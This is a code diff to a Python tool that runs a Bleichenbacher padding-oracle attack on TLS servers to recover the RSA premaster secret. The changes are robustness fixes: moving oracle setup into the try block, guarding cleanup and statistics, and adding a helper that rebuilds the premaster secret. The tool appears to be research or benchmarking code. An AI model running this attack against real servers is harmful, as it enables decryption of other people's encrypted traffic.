@@ -64,10 +64,14 @@ class SharedTLSAttack:
         self.test_oracle = test_oracle
         self.parallel = parallel
 
+    @staticmethod
+    def premaster_secret(recovered_suffix):
+        """Restore the TLS version and preserve all 46 recovered suffix bytes."""
+        return b"\x03\x03" + recovered_suffix.to_bytes(46, "big")
+
     def decrypt(self, encrypted):
         started = time.monotonic()
-        oracle = TLSOracle(None, self.ip, self.port, ch, self.prefix,
-                           self.rsa.e, self.rsa.N, encrypted)
+        oracle = None
         executor = None
         attack = ProofAttack()
         attack.init_process("FFT", self.rsa.bits,
@@ -76,6 +80,8 @@ class SharedTLSAttack:
         error = None
         secret = None
         try:
+            oracle = TLSOracle(None, self.ip, self.port, ch, self.prefix,
+                               self.rsa.e, self.rsa.N, encrypted)
             configure_oracle(oracle, self.rsa, quiet=True, test=self.test_oracle)
             executor_class = TLSBatchExecutor if self.parallel else TLSSequentialExecutor
             executor = executor_class(oracle)
@@ -85,7 +91,11 @@ class SharedTLSAttack:
             error = exc
             raise
         finally:
-            if executor is None:
+            if oracle is None:
+                queries = {"init": 0}
+                round_trips = {"init": 0}
+                phase = "init"
+            elif executor is None:
                 queries = {"init": oracle.calls}
                 round_trips = {"init": oracle.round_trips}
                 phase = "init"
@@ -99,16 +109,18 @@ class SharedTLSAttack:
                 "round_trips": round_trips,
                 "step": "done" if error is None else phase,
                 "error": str(error),
+                "exception_type": type(error).__name__ if error else None,
                 "result": result,
-                "total_queries": oracle.calls,
-                "total_round_trips": oracle.round_trips,
+                "total_queries": oracle.calls if oracle else 0,
+                "total_round_trips": oracle.round_trips if oracle else 0,
                 "debug_statistics": None,
                 "runtime": time.monotonic() - started,
                 "tau": attack.tau_found,
             }
             with open("results.json", "w") as output:
                 json.dump(stats, output)
-            oracle.executor.shutdown(wait=False, cancel_futures=True)
+            if oracle is not None:
+                oracle.executor.shutdown(wait=False, cancel_futures=True)
 
 
 def bleichenbacher_attack_tls(ip, port, quiet=False, benchmark=False,
